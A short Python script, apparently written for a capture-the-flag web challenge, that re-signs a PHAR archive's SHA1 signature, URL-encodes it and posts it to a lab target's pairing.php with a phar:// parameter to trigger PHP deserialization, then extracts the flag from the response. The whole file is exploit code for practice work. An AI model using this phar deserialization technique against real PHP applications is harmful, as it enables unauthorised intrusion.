from hashlib import sha1
import urllib.parse
import os
import re
import requests

pattern = r'flag\{.+?\}'
url = "http://71e7dc79-25d8-4434-930b-dd532ec9ae49.node4.buuoj.cn:81/"  # 替换为题目靶机地址
params = {'pear': '1.phar', 'apple': 'phar://1.phar'}
if os.path.exists(r'd:\XAM\htdocs\learn\Websecuritylearning\Python\Script\1.phar'):
    with open(r'd:\XAM\htdocs\learn\Websecuritylearning\Python\Script\1.phar', 'rb') as file:
        f = file.read()
    s = f[:-28]
    h = f[-8:]
    newf = s + sha1(s).digest() + h
    with open(r'd:\XAM\htdocs\learn\Websecuritylearning\Python\Script\new.phar', 'wb') as file:
        file.write(newf)
        os.remove(r'd:\XAM\htdocs\learn\Websecuritylearning\Python\Script\1.phar')
with open(r'd:\XAM\htdocs\learn\Websecuritylearning\Python\Script\new.phar', 'rb') as fi:
    f = fi.read()
    ff = urllib.parse.quote(f)
    print(ff)
    fin = requests.post(url=url + "pairing.php", data=ff, params=params)
    matches = re.findall(pattern, fin.text)
    print(fin.text)
    for match in matches:
        print(match)
        # os.remove('newtest.phar')
